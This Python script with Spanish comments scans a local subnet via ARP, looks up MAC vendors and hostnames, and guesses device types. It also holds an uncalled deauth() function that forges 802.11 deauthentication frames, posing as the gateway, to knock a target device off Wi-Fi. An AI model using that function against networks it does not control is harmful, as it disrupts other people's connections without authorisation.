import os
import re
import requests
from scapy.all import *
import socket

# Función para escanear la red
def scan_network(ip_range):
    arp_request = ARP(pdst=ip_range)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    devices = []
    for sent, received in answered_list:
        devices.append({'ip': received.psrc, 'mac': received.hwsrc})

    return devices

# Función para obtener información del fabricante a partir de la MAC
def get_device_info_from_mac(mac_address):
    try:
        url = f"https://api.macvendors.com/{mac_address}"
        response = requests.get(url)
        if response.status_code == 200:
            return response.text
        else:
            return "Unknown"
    except Exception as e:
        return str(e)

# Función para obtener el nombre de host de un dispositivo
def get_hostname(ip):
    try:
        return socket.gethostbyaddr(ip)[0]
    except socket.herror:
        return "Unknown"

# Función para combinar información y determinar el tipo de dispositivo
def identify_device(ip, mac):
    manufacturer = get_device_info_from_mac(mac)
    hostname = get_hostname(ip)

    # Heurística simple basada en el hostname
    if "phone" in hostname.lower() or "android" in hostname.lower():
        device_type = "Smartphone"
    elif "tablet" in hostname.lower():
        device_type = "Tablet"
    elif "tv" in hostname.lower() or "television" in hostname.lower():
        device_type = "Television"
    elif "pc" in hostname.lower() or "laptop" in hostname.lower() or "desktop" in hostname.lower():
        device_type = "Computer"
    else:
        device_type = "Unknown"

    return manufacturer, hostname, device_type

# Función para imprimir dispositivos
def print_devices(devices):
    print("Dispositivos en la red:")
    print("IP" + " "*18 + "MAC" + " "*18 + "Fabricante/Marca" + " "*18 + "Hostname" + " "*18 + "Tipo de dispositivo")
    for device in devices:
        manufacturer, hostname, device_type = identify_device(device['ip'], device['mac'])
        print("{:16}    {:18}    {:30}    {:20}    {}".format(device['ip'], device['mac'], manufacturer, hostname, device_type))

def deauth(target_mac, gateway_mac):
    packet = RadioTap() / Dot11(
        addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac
    ) / Dot11Deauth()
    sendp(packet, inter=0.1, count=100, iface="wlan0", verbose=1)

def get_network_interface():
    interfaces = get_windows_if_list()
    for interface in interfaces:
        # check if the interface is wireless
        if 'wireless' in interface['description'].lower():
            return interface['name']
    return None

if __name__ == "__main__":
    ip_range = "192.168.1.0/24"  # Cambia esto por tu rango de IP
    devices = scan_network(ip_range)
    print_devices(devices)
    #network_interface = get_network_interface()
    #if network_interface is None:
    #    print("No wireless network interface found")
    #else:
    #    print("Wireless network interface:", network_interface)
